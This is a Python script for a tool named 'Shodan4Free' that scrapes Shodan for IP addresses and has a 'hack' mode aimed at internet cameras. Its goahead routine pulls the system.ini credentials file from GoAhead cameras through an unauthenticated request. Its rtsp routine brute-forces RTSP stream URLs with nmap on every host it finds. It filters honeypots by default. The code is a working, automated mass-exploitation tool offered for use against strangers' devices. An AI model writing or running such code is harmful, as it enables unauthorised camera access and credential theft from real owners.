import re
import requests
import urllib.parse
import signal
import sys
import colorama
import json
from requests.exceptions import ConnectTimeout, ConnectionError
import nmap

colorama.init(autoreset=True)

def exit_handler(signal, frame):
    print(colorama.Fore.RED + 'You pressed Ctrl+C')
    sys.exit(0)

def vzlom_args_help():
    print("Do you want additional search parameters for cams?")
    print("ex:")
    print("country:RU")
    print('geo:"xx.xxxxxx,xx.xxxxxx"')
    print('org:"PJSC ROSTELECOM"')

def show_help():
    print()
    print("You do not need a shodan account or a subscription to use this program,")
    print("everything works right away and you can even use shodan filters, usually")
    print("only with Shodan membership (tag, vuln ...)")
    print("If you know how to use shodan.io, just enter shodan queries.")
    print("for a list of the simple (and not only) shodan queries, see : :")
    print("https://help.shodan.io/the-basics/search-query-fundamentals")
    print("https://github.com/jakejarvis/awesome-shodan-queries")
    print("https://ia903408.us.archive.org/7/items/shodan-book-extras/shodan/shodan.pdf")
    print("https://www.stationx.net/how-to-use-shodan/")
    print("https://www.shodan.io/search/examples")
    print()
    print("To use Shodan InternetDB, enter internetdb")
    print("To automatically find and exploit vulnerable devices, enter hack")

def search_shodan(query, filter_honeypot):
    if filter_honeypot:
        encoded_query = urllib.parse.quote_plus(f"{query} -tag:honeypot")
    else:
        encoded_query = urllib.parse.quote_plus(query)

    shodan_url = f"https://www.shodan.io/search/facet?query={encoded_query}&facet=ip"
    try:
        resp = requests.get(shodan_url)
        resp.raise_for_status()
        return re.findall(r"\b(?:\d{1,3}\.){3}\d{1,3}\b", resp.text)
    except requests.RequestException as e:
        print(colorama.Fore.RED + f"Error: {e}")
        return []

def search_internetdb(ip):
    url = f"https://internetdb.shodan.io/{ip}"
    try:
        response = requests.get(url)
        response.raise_for_status()
        return json.dumps(response.json(), indent=2)
    except requests.RequestException as e:
        return colorama.Fore.RED + f"Error: {e}"

def goahead(arguments, filter_honeypot):
    if arguments == "":
        if filter_honeypot:
            goahead_query = 'realm=GoAhead port:81 -tag:honeypot'
        else:
            goahead_query = 'realm=GoAhead port:81'
    else:
        if filter_honeypot:
            goahead_query = f'realm=GoAhead port:81 -tag:honeypot {arguments}'
        else:
            goahead_query = f'realm=GoAhead port:81 {arguments}'
    encoded_query = urllib.parse.quote_plus(goahead_query)
    response = requests.get(f"https://www.shodan.io/search/facet?query={encoded_query}&facet=ip")
    html_text = response.content.decode('utf-8')

    ip_pattern = r"\b(?:\d{1,3}\.){3}\d{1,3}\b"
    ips = re.findall(ip_pattern, html_text)

    print(ips)

    for ip in ips:
        print()
        try:
            response = requests.get(f"http://{ip}:81/system.ini?loginuse&loginpas", timeout=5)
            if response.status_code == 200:

                print(colorama.Fore.GREEN + "________________________________________________")
                print(colorama.Fore.GREEN + f"IP address : {ip}")
                print(colorama.Fore.GREEN + f"Response : {response.text}")
                print(colorama.Fore.GREEN + "________________________________________________")
            else:
                print(colorama.Fore.RED + f"This camera is secure : {ip}")
        except ConnectTimeout:
            print(colorama.Fore.RED + "Timeout!")
            continue
        except ConnectionError as e:
            print(colorama.Fore.RED + "Connection error!")
            continue
        except Exception as e:
            print(colorama.Fore.RED + "Unknown error!")
            continue

def rtsp(arguments, filter_honeypot):
    if arguments == "":
        if filter_honeypot:
            rtsp_query = "port:554 -tag:honeypot"
        else:
            rtsp_query = "port:554"
    else:
        if filter_honeypot:
            rtsp_query = f"port:554 -tag:honeypot {arguments}"
        else:
            rtsp_query = f"port:554 {arguments}"
    encoded_query = urllib.parse.quote_plus(rtsp_query)

    response = requests.get(f"https://www.shodan.io/search/facet?query={encoded_query}&facet=ip")
    html_text = response.content.decode('utf-8')

    ip_pattern = r"\b(?:\d{1,3}\.){3}\d{1,3}\b"
    ips = re.findall(ip_pattern, html_text)

    print(ips)

    nm = nmap.PortScanner()

    for ip in ips:
        print(colorama.Fore.RESET + "________________________________________________")
        print(f"IP address : {ip}")
        print()

        try:
            nm.scan(hosts=ip, arguments='-p 554 --script="rtsp-url-brute" -Pn')

            if ip in nm.all_hosts():
                if 'tcp' in nm[ip] and 554 in nm[ip]['tcp']:
                    port_info = nm[ip]['tcp'][554]

                    print(f"Порт 554/{port_info['name']} - {port_info['state']}")

                    if 'script' in port_info:
                        print("\nРезультаты rtsp-url-brute:")
                        if "discovered" in port_info['script']['rtsp-url-brute']:
                            print(colorama.Fore.GREEN + port_info['script']['rtsp-url-brute'])
                        else:
                            print(colorama.Fore.RED + port_info['script']['rtsp-url-brute'])
                    else:
                        print(colorama.Fore.RED + "The program did not return any results")
                else:
                    print(colorama.Fore.RED + "Port 554 is closed or filtered")
            else:
                print(colorama.Fore.RED + "The ip did not respond to the scan")

        except Exception as e:
            print(f"Scan error: {str(e)}")

        print(colorama.Fore.RESET + "________________________________________________")

def main():
    signal.signal(signal.SIGINT, exit_handler)

    honeypots = input("Do you want to filter the honeypots in this session (recommended) [Y/n] : ")

    if honeypots == "Y" or honeypots == "y" or honeypots == "":
        filter_honeypot = True
    elif honeypots == "N" or honeypots == "n":
        filter_honeypot = False
    else:
        print("Write Y or n")
        return

    print("For help enter 'help'")
    print("If you want to use internetdb directly, enter internetdb")
    print("To automatically find and exploit vulnerable devices, enter hack")

    while True:
        query = input(colorama.Fore.GREEN + "root@Shodan4Free # ")

        if query == "internetdb":
            print("Just enter the IP address")
            idb_ip = input(colorama.Fore.GREEN + "root@InternetDB # ")
            if idb_ip:
                print(search_internetdb(idb_ip))
            continue
        elif query == 'help':
            show_help()
            continue
        elif query == "hack":
            print(colorama.Fore.GREEN + "For help write 'help'")
            vzlom_query = input(colorama.Fore.GREEN + "root@vzlom # ")
            if vzlom_query == "goahead":
                vzlom_args_help()
                arguments = input(colorama.Fore.GREEN + "Additional args : ")
                goahead(arguments, filter_honeypot)
                continue
            elif vzlom_query == "rtsp":
                vzlom_args_help()
                arguments = input(colorama.Fore.GREEN + "Additional args : ")
                rtsp(arguments, filter_honeypot)
                continue
            elif vzlom_query == "help":
                print(colorama.Fore.GREEN + "_________________________________________________________")
                print(colorama.Fore.GREEN + "|Command     | what is doing                            |")
                print(colorama.Fore.GREEN + "|goahead     | Automatically hack GoAhead cams          |")
                print(colorama.Fore.GREEN + "|rtsp        | Automaticcaly hack RTSP cams             |")
                print(colorama.Fore.GREEN + "_________________________________________________________")
                print("To re-enter to hack, write hack")
                continue
                continue
            elif not vzlom_query:
                continue

        if not query:
            continue

        ips = search_shodan(query, filter_honeypot)

        if not ips:
            print(colorama.Fore.YELLOW + "No IP addresses were found for your query.")
            continue

        for i, ip in enumerate(ips, 1):
            print(f"{i}) {ip}")

        while True:
            IDB = input(f"Do you want to use Shodan InternetDB [Y/n] : ")
            if IDB == "Y" or IDB == "y" or IDB == "":
                try:
                    ip_num = int(input(colorama.Fore.GREEN + "root@InternetDB # "))
                    if 1 <= ip_num <= len(ips):
                        print(search_internetdb(ips[ip_num-1]))
                        break
                    print(colorama.Fore.RED + f"Enter a number between 1 and {len(ips)}")
                except ValueError:
                    print(colorama.Fore.RED + "Enter a correct number")
            elif IDB == "N" or IDB == "n":
                break
            else:
                print("Write Y or n")

if __name__ == "__main__":
    main()
